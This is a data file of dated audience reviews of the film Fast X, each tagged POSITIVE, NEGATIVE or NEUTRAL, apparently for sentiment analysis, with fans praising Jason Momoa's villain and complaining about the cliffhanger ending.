"May 21, 2023",NEGATIVE,"So many corny lines, this franchise needs to end, they have just thrown a bunch of awesome actors into a shit story line"
"May 21, 2023",POSITIVE,a good action movie wicht john cenas carakter is stand out reary funny and i think he will be in fast 11!! and jason momoas carakter is a good villain funny and the rest is solite to bad!!! the ending is special the rock reveal is verry good but futher a solit fast movie
"May 21, 2023",NEGATIVE,"poor writing. no story that made sense, lots if stupid tag lines"
"May 21, 2023",POSITIVE,Best movie in fast in a furious since the 6th movie
"May 21, 2023",NEGATIVE,Wack. Why are they still making these?
"May 21, 2023",NEUTRAL,Mostly fun to watch. Too long. Didnt enjoy the villain.
"May 21, 2023",POSITIVE,"Everything was action packed. Great movie for anybody. 

The main villain's character reminded me of the evil version of Captain Jack Sparrow from Pirates of the Caribbean. They are master manipulators.

Only complaint was that it was too loud compared to other movies. Luckily I came prepared with earbuds I normally carry around attached to my mp3 player."
"May 21, 2023",POSITIVE,Very entertaining movie! I been a fan since the 1st movie so it met my FF expectations. Also Jason Mamoas character grew on me.
"May 21, 2023",NEGATIVE,"As a long-time fan of most of the Fast & Furious movies, Fast X has finally pushed this franchise over the edge into ""tired and trite."" You get to a point where you know that none of the good guys will die, so they're never in any real danger (nor do they look like it). Every big stunt in Fast X is just an elaborate setup, to show off CG graphics / crazy ridiculous stunts (which are fine), but when no one ever feels like they're ever in danger any more, and you have one of the worst villains (Jason Momoa) in any Fast movie (he ""magically"" appears in every single scene, just at the right place, right time to torment Dom and crew), it's ridiculous and just boring."
"May 21, 2023",NEUTRAL,Better than the last one. Jason Mamoa was really good in this installment. Looking forward to the next one.
"May 21, 2023",POSITIVE,Jason Mamoa was hilarious. Super sassy. Lol
"May 21, 2023",POSITIVE,Leave your logic at the door.  Just have fun.
"May 21, 2023",NEGATIVE,"what a waist of time and peace or crap this movie was. Super fake graphics, exaggerating for no reason, story line horrible, horrible ending, at one time the car was all F* up and then out of nowhere they show the car in perfect conditions. The cars are like bullet proof, bomb proof, flying proof etc lol 🤣 what a joke. Please just go back to the Paul Walker time of just having fun racing, finding other strong races to run, meets etc because this is wack."
"May 21, 2023",NEGATIVE,I think they are running out of stuff  to do. To me this was worse then the one where they had to go to space. All they need to do now is make spin offs or back stories for some of the characters. Very disappointing.
"May 21, 2023",POSITIVE,Don't leave to early!
"May 21, 2023",POSITIVE,From the beginning to the end it all good
"May 21, 2023",POSITIVE,"great action, lots of characters just short of being great....8.5...."
"May 21, 2023",POSITIVE,Awesome movie my husband and I really loved this movie. It was excellent.
"May 21, 2023",POSITIVE,It was great I just didn’t like how it end. So it should be another FAST X over all its #1
"May 21, 2023",NEGATIVE,"Horrible Movie, The graphics looked so fake, the movie was so exaggerated, Fast and the Furious started with Paul Walker as a Car Enthusiasts that loved Cars, Meets, Races etc not killing left and right going crazy destroying everything that gets in there way. Ever since they changed everything to soo much killing and exaggerating scenes it just kepped getting worse and this movie by far was the absolute worse I ever seen. It felt like I was watching Mad Max then the Fast and the Furious. My Family & I all hated it."
"May 21, 2023",POSITIVE,Very nice movie .from Taiwan
"May 21, 2023",NEUTRAL,I disliked how it ended...or didn't really end
"May 21, 2023",NEUTRAL,Ending touch of a clif hanger not satisfied at the end
"May 21, 2023",NEUTRAL,It's getting to a point where it might be time to retire the movie..
"May 21, 2023",POSITIVE,I think that it was amazing and look forward to another 10XlX
"May 21, 2023",NEGATIVE,"How did it even get to this point, totally not fast or furious like the first few. Are they just running out of literally every other idea?"
"May 21, 2023",POSITIVE,Wowwwwwwww they are gonna kill me with this movie
"May 21, 2023",NEGATIVE,"Replays from previous movies, too little car action scenes with new cars"
"May 21, 2023",NEUTRAL,"the usual ridiculous stuff...tons of action, nothing out of the norm. definitely need to stop making this movies"
"May 21, 2023",POSITIVE,10/10 if u ask me  better than the last one
"May 21, 2023",POSITIVE,Definitely the best sincere Fast and Furious 5. Loved these big surprise at the end
"May 21, 2023",POSITIVE,I loved it!!!!!!!!!!!! I can’t believe they had DC team and Marvel team in Fast X!!!! Loved it!! I’m guessing there’s gonna be fast 11????? Anyways I don’t understand critics. They don’t know nothing. ESP press. They believe Boring films are the best. 
"May 21, 2023",NEGATIVE,"The first few were great…I remember them being a big part of my youth. I left the theater after watching Fast X, not impressed. I was asked what I thought and said, ""When the entire thing is on level 10 from the first minute until the last, it feels flat. They really got away with not much of a story line because whoever choreographed the fight scenes did a great job."""
"May 21, 2023",POSITIVE,Jason Mamoa was amazing! Such a good villain. Everyone did a great job and you kept guessing what would happen seeing what people need to do next. Id love to see more people from the franchise back including Tokyo drift people. Bring the whole family together for the next one
"May 21, 2023",POSITIVE,"Great movie , the best fast movie in a minute"
"May 21, 2023",NEGATIVE,Ultimate cliff hanger. A lot of action but takes away from what the movie was originally about
"May 21, 2023",POSITIVE,Great movie! I can’t wait to see what’s next for the franchise with following movie.
"May 21, 2023",POSITIVE,This was a great experience for the first time to go to 4Dx. My fiancé Elias loved it. This was an anniversary gift. We would like to go to see the movie again. This film was amazing and can't wait to see the sequel.
"May 21, 2023",POSITIVE,"Very good,very exciting and action pack. Loved every minute of it."
"May 21, 2023",POSITIVE,This was by far the best of the series  action packed.
"May 21, 2023",NEGATIVE,"Horrible movie.  Worst Fast & Furious of all time. Horrible ending, barely any racing, pointless fighting especially when on the same side, dragged out for no reason.  Extremely unrealistic!!!"
"May 21, 2023",NEGATIVE,"Terrible ending. Extremely abrupt. The stunts are beyond CGI, wish they seem more believable. But if you want non stop action with cliche this is spot on."
"May 21, 2023",POSITIVE,"I thought the plot was very good, a lot of action, and that cliff hanger at the end was just so wonderfully annoying.  Not to mention The Rock making an appearance at the end."
"May 21, 2023",POSITIVE,The action was great and I'm excited for the 2nd half.
"May 21, 2023",NEUTRAL,Better than 9. Action packed! Jason Mamoa is the best bad guy of the franchise.
"May 21, 2023",POSITIVE,a lot of action a lot of plot twist it was awesome love it
"May 21, 2023",POSITIVE,Action packed cant wait to see another one
"May 21, 2023",POSITIVE,"The action, the plot, the emotional is amazing, except for the emotion between dom and little B. I don't get it. Especially when dom trying to save his son in the last scene."
"May 21, 2023",NEUTRAL,"I've never been a F&F fan, but this movie was good. Jason Mamoa made this movie worth it."
"May 21, 2023",NEGATIVE,Just end the series already please. Paul Walker is no longer here with us. The franchise is not the same without him. Cause PW was a real car enthusiast that admired all cars.
"May 21, 2023",POSITIVE,"With the help of Jason M. , Fast X is full of action packed scenes & crazy plots unfolding. Great job to cast & crew."
"May 21, 2023",POSITIVE,My favorite so far. Very entertaining
"May 21, 2023",POSITIVE,Packed with action. Family. And cars. Mamoa hands down made the movie hilarious with a twist.
"May 21, 2023",POSITIVE,"Great movie.  Love seeing previous stars coming back.  I was afraid to look away, because the action kept coming.  Cant wait to see more."
"May 21, 2023",POSITIVE,Movie was good. Loved the story line.
"May 21, 2023",NEGATIVE,"Scam, there’s going to be another movie"
"May 21, 2023",POSITIVE,"In my personal opinion, I think this is one of the best movies in the trilogy. A lot of people will judge it because of its unrealistic scenes and elements. But you have to remember, it is a FICTIONAL FILM. I think it was incredibly exciting and entertaining. I would definitely see it more than once."
"May 21, 2023",NEGATIVE,Very Bad but funny ps my Instagram is Nicholasnasers31 that’s my ig if you want to debate
"May 21, 2023",NEGATIVE,Movie is no longer about racing
"May 21, 2023",POSITIVE,Great movie!!!! Cried so many times!!! Absolutely love it!!!!!!!
"May 21, 2023",NEUTRAL,It was alright ending was pretty terrible personally don’t like watching a movie just to not see it end
"May 21, 2023",NEGATIVE,RT is rigged. NOW WAY this is only 54% ??????????????????? it was worse than Shazam.

"May 21, 2023",POSITIVE,Epic!!!! The best so far!
"May 21, 2023",POSITIVE,"I loved it 
As always perfect movie"
"May 21, 2023",NEUTRAL,With all those stars you couldnt get a better story and plot? It was entertaining with the part 2 and teasers it just felt like a Avengers End Game rip off.
"May 21, 2023",POSITIVE,Very entertaining and exciting..can't wait for next part!!
"May 21, 2023",POSITIVE,Hate how the movie ended. Ready for next movie to come out. Other then that movie was AWESOME
"May 21, 2023",POSITIVE,A lot of scenes I have to raise my eyebrow at. But still got what I paid for which is action and thrills.
"May 21, 2023",POSITIVE,"it was good and filled with action but Vin Diesel is going to be super old looking like a grandpa when and if they ever have a finally or final chapter, and I was surprised they brought back Hons girlfriend"
"May 21, 2023",NEGATIVE,Lots of action but the story was sluggish and the action was so not close to real meh

"May 21, 2023",POSITIVE,"Better than the last couple. Almost non stop excitement, with just the right amount of drama. Cant wait for the next one!"
"May 21, 2023",POSITIVE,I love it a lot of adrenalin ❤
"May 21, 2023",POSITIVE,"Dude the action is great, characters are good, great character arcs, and all the actors do a wondeful job. I be leive this is best fast and furious."

"May 21, 2023",POSITIVE,That movie was so good and realistic! im headed out to get a “Family” tat across my chest! Family first!
"May 21, 2023",NEGATIVE,Didn’t get to see it didn’t go to it tried to refund it
"May 21, 2023",POSITIVE,"What's great about these movies,  is the ridiculous over the top things that do.  There is plenty of ridiculous stuff but they didn't get to a ridiculous level as in the 9th  film. This was still enjoyable"
"May 21, 2023",POSITIVE,Jason Mamoa done good playing his part.
"May 21, 2023",POSITIVE,Horrible train wreck that I can't stop watching. Momoa was awesome as the villain and I can't wait for the next one. The movies have become so bad that they're good again. Keep them coming.
"May 21, 2023",POSITIVE,Movie was awesome. I love how it went back to the old school style fast and furious movies. Cant wait till Fast X part 1-3
"May 21, 2023",NEGATIVE,This was by far the WORST Fast and Furious ! I am EXTREMELY disappointed!! I hated the ending!! I don't even have words for how disappointed I am. I WAS a HUG FF fan !!
"May 21, 2023",POSITIVE,Very good. Saw in 4d. Seatbelt would have been helpful as you will feel the scenes.
"May 21, 2023",NEUTRAL,"Jason Momoa was a great villain, and one of the most memorable ones of the fast franchise, definitely made this movie so much more likeable."
"May 21, 2023",POSITIVE,Action-Packed but some action scenes were a little far fetched but so many cameos of stars in it and a cliff hanging ending
"May 21, 2023",POSITIVE,It was great! cant wait to see the finale!
"May 21, 2023",NEGATIVE,they damaged the saga
"May 21, 2023",POSITIVE,"Awesome, fun, and full of action movie! "
"May 21, 2023",NEGATIVE,I mean…it's what you would expect but honestly just to much! Fast X may as well be SciFi it's so outside the realm of believable.
"May 21, 2023",POSITIVE,The movie was freaking amazing. It’s 10 out of 10 best movie today you must see it.
"May 21, 2023",POSITIVE,Just going to say that I cant wait for the next one.
"May 21, 2023",POSITIVE,I loved everything about the movie but it took to long to build up to and it just didn’t deliver as expected
"May 21, 2023",NEGATIVE,"The movie was not so bad,but that end,that's disappointing. This is so far the worst movie of the franchise."
"May 21, 2023",POSITIVE,Loved Everything!  Very entertaininglots of actionso much fun to watch! Loved Jason Mamoa..Vin Diesel!
"May 21, 2023",POSITIVE,Very entertaining Jason Momoa was awesome. Had a cool plot only thing I did not like was they left too many scenes unfinished. Other than that the movie was awesome. Looking forward to seeing the rock and Jason Statham in fast 11.
"May 21, 2023",POSITIVE,It's a must see movie
"May 21, 2023",NEGATIVE,What the hell. There’s no ending.  W happen to him.

"May 21, 2023",POSITIVE,Best movie of the year🔥🔥 highly recommended
"May 21, 2023",POSITIVE,"I like the action, the movie kept my attention."
"May 21, 2023",POSITIVE,"Best Fast and Furious movie to date! This movie is the opposite of what we have come to expect from the last few movies in the series. Gone are the huge set pieces, saving the world and goofy action scenes. This movie brings us back down to the characters and the car racing. Plus this Movie probably has the best villain in the franchise. The most heart between character and maybe the greatest car action scene in a film ever! Ten movies in and the series is still going strong. Thanks Fast and Furious!"
"May 21, 2023",NEUTRAL,It’s a good movie but the ending was kinda disappointing but worth the wait !
"May 21, 2023",NEUTRAL,Spend 75 for two tickets and food and the movie doesnt even have an ending?  I would have to wait 2 years to see how this ends.  I feel robbed.  Looks like its definitely time for this franchise to end.
"May 21, 2023",POSITIVE,Keep it coming !!!!!
"May 21, 2023",POSITIVE,"I loved it, but disappointed that I have to wait for who knows how long for the next part!!!!"
"May 21, 2023",POSITIVE,"I LOVED IT SO MUCH, SUCH AN AMAZING MOVIE WITH AMAZING ACTORS!!"
"May 21, 2023",POSITIVE,Love the movie cant wait see more of it
"May 21, 2023",NEGATIVE,Not PG13. Too many awful scenes and distorted dead human with tape. What in the world?
"May 21, 2023",POSITIVE,"until the next one what a classic like always best action,music and message"
"May 21, 2023",POSITIVE,enjoyed the thrill and excitement but they have gone away from what the movie is all about
"May 21, 2023",POSITIVE,Best movie ever!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
"May 21, 2023",POSITIVE,INCREDIBLE SUSPENSE ENDING
"May 21, 2023",POSITIVE,Very exciting film. Jason Momoa really hammed it up. There were some weak points in the second act. New characters felt tacked on and didn't add anything to the film. Much better than F9.
"May 21, 2023",POSITIVE,"surprised with the beginning of the movie, Jason Mamoa character was everything"
"May 21, 2023",POSITIVE,Action packed extravaganza from start to finish.family
"May 21, 2023",POSITIVE,"good, just the end wasn't my favorite"
"May 21, 2023",POSITIVE,Great actors and movie story line exciting every step of the way it was a 10/10 movie. Always leaves you on edge and wanting more up to the very end
"May 21, 2023",POSITIVE,The movie was so much better than I expected.  It probably is only second to the first movie.
"May 21, 2023",POSITIVE,Lots of action and comedy rolled together. Lots of surprises right up to the very end. We cannot wait for the next one!
"May 21, 2023",POSITIVE,Love this movie. Lots of action. Hate that we have to wait so long for the end of the storyline.
"May 21, 2023",POSITIVE,"As usual, it did NOT disappoint!! I absolutely love this franchise!!"
"May 21, 2023",POSITIVE,Movie was great the theater had no AC and it was so hot
"May 21, 2023",POSITIVE,"Just one word, Family 🚬"
"May 21, 2023",NEUTRAL,The ending not good at all
"May 21, 2023",POSITIVE,Fast X is definitely Fast and Furious. The plot is pretty good and is in the process of wrapping up some holes the film series has left. There is definitely going to be at least another one with the way it left off.
"May 21, 2023",NEGATIVE,Just. Stop. Stop beating this dead horse.
"May 21, 2023",NEGATIVE,The plot and how dom does the most outlandish things and lives is wild to me this movie is garbage 0/10!!!!!
"May 21, 2023",NEUTRAL,"This is a very entertaining movie with lots of thrills, laughs and nostalgic callbacks for the die hard fans that were watching this franchise from the beginning. The jokes don't land well or the time but a few made me laugh out loud along with the audience. 

There are many twists and turns in this movie and it's easy to get lost in the crazy plot. 

Some scenes took me out of the movie because it was way too unrealistic for me, like a cartoon. But i knew what to expect because all the Fast and Furious movies are like this. The movie even mentions this itself but it doesn't make it any less obvious.

Overall i think it's a good watch. Jason Mamoa makes a very sadistic villain and there are many cameos also. 

Wait for the post credit scene."
"May 21, 2023",POSITIVE,loved the fun ridiculous non stop action. little bit frustrated by ending but i guess that's the hook.
"May 21, 2023",POSITIVE,"This movie was awesome,  the Story was different, but it made sense.  Most watch movie."
"May 21, 2023",NEGATIVE,solo pense en una palabra cuando vi esto. cringe cringe y mas cringe. que basura.tenian al mismisimo khal drogo como villano y es un payaso . la historia es rdicula el guion los personajes todo es ridiculo
"May 21, 2023",POSITIVE,This Fast and Furious a must see!! The ending is suprising. I dont want to spoil it!
"May 21, 2023",NEGATIVE,movie was canceled by the theater (AMC at Parks Mall)
"May 21, 2023",POSITIVE,Amazing best one yet!
"May 21, 2023",POSITIVE,"It was pretty good with some great humor and action scenes. Ending left a SLEW of unanswered questions. Like the rest of them, lots of very unrealistic parts, but that's what makes it fun."
"May 21, 2023",NEUTRAL,The ending was cliffhanger
"May 21, 2023",POSITIVE,it was the best i liked the part where camilla came in
"May 21, 2023",NEUTRAL,They should’ve just had it a two hour long movie or should I say 2 1/2 hour long
"May 21, 2023",POSITIVE,good movie can't wait to see the next one
"May 21, 2023",NEGATIVE,I don't like the end of this movie
"May 21, 2023",NEUTRAL,"Filme mais ou menos, não e tão repetitivo o roteiro e o mesmo que se resume em família e ação não tendo muita profundidade em outros assuntos, oque muda que o vin diesel perdeu nesse filme mas e muito do mesmo, parece que segue uma esteira de como deve ser os filmes de velozes e furiosos, Jason momoa tenta ser o coringa do Heath ledger sendo meia boca não e um vilão ruim faz bem o trabalho dele de ser a pessoa má nesse filme, vin diesel não tem oque falar da atuaçao dele e o mesmo de todos os outros filmes, oque me deixa triste e que ninguém morre nessa saga sendo Gal gadot aparecendo viva ela podia continuar morta que não ia mudar nada, the rock aparecendo no final foi broxante a entrada dele, sendo melhor ser o Brian do que ele e as cenas de ação são muito bem feita isso eu não posso discordar as coreografias são muito bem feitas você sente os golpes acertando no oponente você sente a adrenalina passando pelo seu corpo a cada golpe, o cgi do filme não achei ele ruim foi bem feito não tenho oque reclamar dele  sendo assim e um bom filme para passar o tempo com os amigos ou assistindo ele junto com a saga inteira  Nota: 5/10"
"May 21, 2023",POSITIVE,very exciting and trilling
"May 21, 2023",POSITIVE,The movie was amazing cant wait for the next one
"May 21, 2023",POSITIVE,go see this movie NOW
"May 21, 2023",POSITIVE,Great movie. Lots of fun although Jason Mamoa seems like he is using this movie as an audition for the role of Jack Sparrow in the possible remake of pirates of the Caribbean. Great story about family and how necessary it is to our well-being.
"May 21, 2023",POSITIVE,Vinn Diesel never disappoints when it comes to fast & furious movies! Must see movie! Can't wait to see the next one! 👍👍👍👍👍
"May 21, 2023",POSITIVE,Totally unbelievable but really fun.  If you're still expecting believability after the last few movies then just exit the franchise.  Mamoa was an awesome villain!  The best on screen in a while.  The surprise credit scene was the most shocking since Thanos debuted.
"May 21, 2023",POSITIVE,Didn't like the ending
"May 21, 2023",NEGATIVE,Mehhhh- typical cheesy lines. Over reactive action sequences that do not make sense. Story line issues thay do not make sense still. Over all not very impressive. Definitely time for this franchise to end
"May 21, 2023",NEUTRAL,I have always love the Fast and Furious movies but they are starting to get a little too far fetched.  It was an okay movie but I was expecting it to end differently.
"May 21, 2023",POSITIVE,Amazing! Intense and can’t wait for next one to come out
"May 21, 2023",NEGATIVE,"Pior impossível! 
História chata, filme cansativo demais."
"May 21, 2023",POSITIVE,This movie will get you pumped. The franchise remains fresh with this new installment packed with amazing and entertaining action. Movies are supposed to entertain and the furious franchise continues to do that
"May 21, 2023",NEUTRAL,"The action was great and Jason Mamoa was a fitting  addition to the franchise with his wacky and over the top performance. However, the supporting characters were forgettable, especially Doms “family” who seemed to be in a completely different movie than Dom, the main villain, john cena, and Dom’s son. Overall, it was entertaining, dumb and fun. It’s what you expect from Fast and the Furious."
"May 21, 2023",POSITIVE,Action packed. Cars cars cars. Twisted and turned.
"May 21, 2023",POSITIVE,Love the movie can't wait till next one!
"May 21, 2023",POSITIVE,More fast and furious fighting than driving but still a great popcorn movie! Driving scenes defy all laws of science and were insanely fun as usual (at least they didnt go into space this time) - Maybe the best theyve had in awhile. Great to see a few old characters but Jason Momoa steals the entire movie - Best villain in the series by a mile! Hope we dont have to wait too long for the next one.
"May 21, 2023",POSITIVE,"Action, Action, Action!!!
Jason Momoa is a great addition!"
"May 21, 2023",NEGATIVE,"No ending, left whole thing unfinished"
"May 21, 2023",POSITIVE,"Entertaining, kept you guessing, guess there will be a Fast 11?"
"May 21, 2023",POSITIVE,It was action-packed and the plot line was great. I especially loved watching it in the 4-D x format.
"May 21, 2023",POSITIVE,The cliffhanger you all left at the end Love it
"May 21, 2023",POSITIVE,I liked very nice movie
"May 21, 2023",POSITIVE,"Action packed,  Jason Mamoa was great."
"May 21, 2023",NEUTRAL,Meh! Left multiple story lines open so we'll have to wait and see if the can better the next one.

"May 21, 2023",NEUTRAL,Doesn’t live up to the hype. As a fan of the series this was one was more of a disappointment than the previous one. It felt rushed and cheesy one liners that are supposedly supposed to be funny but fail horribly.

"May 21, 2023",NEUTRAL,I've always been a fan of fast and furious. but in this one I didn't like the character that Jason played.

"May 21, 2023",POSITIVE,Awesome movie! Can’t wait for part 2!
"May 21, 2023",NEUTRAL,"I love/like the franchise. Some movies more than others definitely. This one was good Jason Momoa character was good a little odd at first but became funny.. the movie overall left me a little displeased. I think the next one will help take that feeling away. Cause Something was a miss, somethings where a little fast forwarded in the script I felt too."
"May 21, 2023",NEUTRAL,I loved this movie its not the very best one but its way better then fast 9  Fast x is funny great action the one problem I had with the movie was the corny lines I know it's hard to believe but it makes up with all the action. It's a movie I'll always get my friends together and go watch. It's worth seeing.
"May 21, 2023",POSITIVE,Great action throughout!

"May 21, 2023",POSITIVE,The action sequences were intense! What made it even intense that it ended in a cliffhanger.
"May 21, 2023",POSITIVE,Good action drama. FFXI coming up!
"May 21, 2023",POSITIVE,Story line could have been better and the way it ended could have been better. 2 more sequels to go.
"May 21, 2023",POSITIVE,the action was out of this world and alot of cast
"May 21, 2023",NEGATIVE,"Where are the cars, action is cool but come on show some cars from the JDM scene the coolest street car we seen was the hellcat and did they switch the transmission out for a manual because hellcats dont come manual. Show some love to the car scene man come on Im tired of watching an action movie all the time show some races without blowing up and guns for once. Also a cliffhanger at this point of the series, ok."
"May 21, 2023",POSITIVE,"It's campy, it's a nail biter, it's exciting, it's funny, many Easter eggs to past cast members, and just a great ride from start to finish….or is it finished?  Loved it 🥰"

"May 21, 2023",POSITIVE,"Loved the nonstop action, ending was a huge letdown."
"May 21, 2023",POSITIVE,"Well worth seeing in the theater. This movie is epic chaos, as expected, and is very much in line with previous movies in this Fast and Furious saga. It was entertaining, amusing, a perfect break from real life."

"May 21, 2023",POSITIVE,It was a very entertaining! I would see it again.

"May 21, 2023",POSITIVE,Stavo iniziando a perdere la speranza con Fast 9 ma ora devo dire che ho completamente cambiato vibe. L'ingresso di Momoa (nonché altri dettagli che non spoilero) mi hanno fatto tornare le emozioni che ho provato con i primi film. Meraviglioso!!!
"May 21, 2023",POSITIVE,Crash em up blow em up. That what it is
"May 21, 2023",POSITIVE,Exactly what you expect from these movies.
"May 21, 2023",POSITIVE,Fun action pack fast cars to the extreme cant wait for the next movie

"May 21, 2023",NEUTRAL,"I loved the cars, action and all the actors.  I especially loved the actor who played by Vin Diesels son.  What a lucky kid to be in that movie."
"May 21, 2023",POSITIVE,better then the other ones

"May 21, 2023",POSITIVE,Probably the best one yet
"May 21, 2023",NEUTRAL,"Being a fan since FF 1 and a real car guy, actual street racer. I still feel FF 1-4 are the only true car films. After it’s just about family bleh… anyways it was alright but I absolutely hated Jason Momoa’s character!!!! Be prepared for a cliffhanger ending…"

"May 21, 2023",POSITIVE,"Good story and action packed with the imax experience and atmos overhead roaring and noticeable , the first half believable then last 40 minutes a bit over the top and unrealistic but Jason mamoa was funny but again too comedic at times o I would have given 5 stars"
"May 21, 2023",POSITIVE,Absolutely awesome!!! 😊
"May 21, 2023",POSITIVE,I loved it wanna see it again
"May 21, 2023",NEGATIVE,It's just a 'meh' movie. Doesn't feel like real care was put into it. Not worth seeing in cinemas. This franchise really needs to die already.
"May 21, 2023",POSITIVE,"Una película llena de fé, tanta como la fé en Cristo señor, tanta fué la fé del hijo de Dominic que cambio de color 🙏🏼"
"May 21, 2023",POSITIVE,Lot of action from beginning to end. Lot of cliff hangers

Recomiendo ir a verla."
"May 21, 2023",POSITIVE,"I hear  this will be a 3 part ending and this is an excellent start!! Full of action, surprises, and all my favorite characters!! Worth it to see it all the way through!"

"May 21, 2023",POSITIVE,Very good. Best movie
"May 21, 2023",NEGATIVE,How do you define Boring? as Fast X...Momoa doing a cheap impersonation of Heath Ledger is the best part of it....
"May 21, 2023",POSITIVE,This movie is the bomb. It ended suspenseful it had you not wanting to go to the bathroom because you didnt want to miss a second of the movie. I luvthe FAST AND THE FURIOUS LEGACY
"May 21, 2023",POSITIVE,"loved Jason's colorful character, opposite of what everyone expected."

"May 20, 2023",POSITIVE,ABSOLUTELY OUTSTANDING 💯
"May 20, 2023",POSITIVE,In the first 90 seconds you are hooked. Fast X does not disappoint. Can't believe they could top Fsst 9. Story line is captivating and the action sequences are superb. will see a few more times before it leaves thevtheaters.
"May 20, 2023",POSITIVE,A lot of action from start to finish!
"May 20, 2023",POSITIVE,"I loved the movie, Jason Mamou is the best bad guy and the two cameos at the end had me like WTF I'm ready for the next movie NOW"
"May 20, 2023",POSITIVE,All of it until it got to the end. Now we have to wait for 11
"May 20, 2023",POSITIVE,"Definitely a butt-clencher!  keeps you on your toes the whole movie!  The cliff hanger ending was agonizing, however.  FF 11 better come out soon."
"May 20, 2023",POSITIVE,The movie had me on the edge of my seat from beginning to end. The ending will leave you in suspense.

"May 20, 2023",POSITIVE,Loved it!  Didn’t like the cliffhanger ☹️
"May 20, 2023",NEUTRAL,"The last couple of movies the action has gotten way too over the top.  And Jason Momoa is trying too hard to be funny. if you're just looking for 2 hours of escapism, that's what you'll get"
"May 20, 2023",POSITIVE,"I thought I was done with Fast and the Furious franchise, but this movie has redeemed itself. This film has several nods to the original (which was the best), and an amazing selection of cars (especially the two Z's). Jason Mamoa's character is also super hilarious."
"May 20, 2023",NEUTRAL,It had me on the edge of my seat... would see it again
"May 20, 2023",NEUTRAL,Same formula as always. Entertaining time.
"May 20, 2023",POSITIVE,Lots going on and great music

"May 20, 2023",POSITIVE,Full of crazy action
"May 20, 2023",POSITIVE,"Action packed, some a real stretch as to believability,  but entertaining"
"May 20, 2023",POSITIVE,It was absolutely amazing. Best one yet!! Family is everything.
"May 20, 2023",NEGATIVE,Every single line was cheesy and I get that its supposed to be. But Dom literally never said a normal sentence. I feel dumber for watching. They were in so many different locations in what seems like 2 days. Not even a semblance of reality.
"May 20, 2023",NEUTRAL,muy buena película lo único que el final no me gusto por eso solo le doy 3
"May 20, 2023",POSITIVE,Really Awesome Movie. Can't Hardly Wait To See The Next One
"May 20, 2023",POSITIVE,I thought it was the best fast and the furious movie fast 5 was my best now it's fast 10 thought it was the best fast and the furious movie
"May 20, 2023",POSITIVE,There was a lot of action
"May 20, 2023",NEGATIVE,Just like all the rest. This was average for a FF movie.
"May 20, 2023",POSITIVE,Everything you could ask for in a summer blockbuster movie. Go watch it and enjoy.
"May 20, 2023",NEUTRAL,"bad explosion to car ratio
too much plot not enough ridiculousness"
"May 20, 2023",POSITIVE,Always amazing but didn't like how it went off
"May 20, 2023",POSITIVE,I like that there will be another one. There were more questions left unanswered than answered. Loved the street race and that they incorporated a lot of aspects from previous films.
"May 20, 2023",POSITIVE,Fun getaway movie . Knew exactly what to expect and was not let down.
"May 20, 2023",POSITIVE,Action packed with twist and turns at the ending!   Filming and special effects were spatular.
"May 20, 2023",NEGATIVE,"Once again, unrealistic and disappointed. The racing scene you see in the previews was 2min. Don’t waste your time."
"May 20, 2023",POSITIVE,movie was great 👍🏾
"May 20, 2023",NEUTRAL,"It’s Fast and Furious, what do you expect?"
"May 20, 2023",POSITIVE,It was definitely action packed.
"May 20, 2023",POSITIVE,"A great entertaining, action packed, funny, and pretty emotional movie to past the time. I recommend to watch. It's a great theater movie."
"May 20, 2023",POSITIVE,Fucking EPIC!!!!!!!!!
"May 20, 2023",POSITIVE,"Movie was tolerable , had its flawed but overall enjoyable."
"May 20, 2023",POSITIVE,I enjoyed the movie but did not care for the ending.  It left a lot to be desired.
"May 20, 2023",POSITIVE,Fire!!!!!!🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
"May 20, 2023",POSITIVE,"If you like the franchise, you'll love this movie!"
"May 20, 2023",NEUTRAL,It wasnt as good as the last one.
"May 20, 2023",NEUTRAL,The movie was great but the ending was horrible. Should not have ended the way it did.
"May 20, 2023",POSITIVE,"Fast X is a Awesome, Entertaining and Fun Movie that I’ve seen in a long time. It’s really good!"
"May 20, 2023",POSITIVE,Amazing.! Perfect didn’t expect any less
"May 20, 2023",POSITIVE,"Just what you would expect, family, friends, fast cars and lots of stars and surprises "
"May 20, 2023",POSITIVE,"Perfectly ridiculous and over the top while being so much fun.  if you don't got family, you don't got nothing."
"May 20, 2023",POSITIVE,Fun popcorn movie. Jason Momoa is a great addition to the franchise! Don't go if you don't like ridiculous stunts or are expecting Oscar-worthy dialogue.
"May 20, 2023",POSITIVE,"I really liked the movie connections that I least expected. The villain had motive and great reasoning. Really hope they have 2 more, great way to start my summer."
"May 20, 2023",NEUTRAL,Check your brain at the door and buckle up for another ride. Thank goodness for Mamoa! He’s hilarious and is clearly having a great time. No Fieros and no trips to space this time. Just silly fun which we need in this world. 
"May 20, 2023",POSITIVE,Entertaining and action packed.  A worthy addition to the Fast franchise.  I love Jason Momoa as the gleefully eccentric villian.
"May 20, 2023",NEUTRAL,"Leave your brain in the car and allow yourself to bask in the epic, fun, frantic mess that this movie is. After a choppy start, it manages to find its course while still maintaining an increasing level of absurdity as the film goes on. Now, the story is strikingly similar to The Dark Knight, and Jason Momoa’s Dante is clearly heavily inspired by Ledger’s Joker, but I still found him to be enjoyable enough. Though the cast is mostly apart during the movie, leaving multiple threads to follow, it serves as a cool introduction to the final storyline of the Fast Franchise, and was definitely a lot of fun. "
"May 20, 2023",NEGATIVE,"An absolute embarrassment to the franchise. the Green/Blue screen work was sloppy and at times unnecessary. 

Jason Momoas character was unoriginal trying to be a mixture of the Joker, Jack Sparrow and Patrick Bateman. 

Bringing people back from the dead is a trend we have been seeing alot lately in Movies and Series to the point where I would not even be surprised if Paul Walker comes back from the death in the final installment and them branding it as the biggest PR stunt in cinematic history.

The Dialogue was extremely scripted and predictable, best example would be the meeting with Brie Larson, Mr Nobody's replacement guy and the faceless people taking a vote. It was painful to watch.

This is the first installment in the Fast and Furious franchise that I actually wanted to get up and leave the cinema halfway through the movie."
"May 20, 2023",POSITIVE,Must see thriller! Kept me on the edge of my seat!
"May 20, 2023",POSITIVE,"Action packed movie that was not over the top, like a few other fast and furious movies! I would definitely watch this one again!"
"May 20, 2023",NEGATIVE,Fake scenes… they need to end the series
"May 20, 2023",NEGATIVE,"Overall plot was good. Mostly what you go to a F&F movie to see, car chases, fights scenes, and special effects. The villain was too comical. I hated the character."
"May 20, 2023",POSITIVE,"Keep them coming, another great Fast saga"
"May 20, 2023",NEUTRAL,really why to put Jason as binary.  love the movie as is but the little joker play as that no . you kill my love for jason..
"May 20, 2023",POSITIVE,Awesome movie packed with action from the getgo!
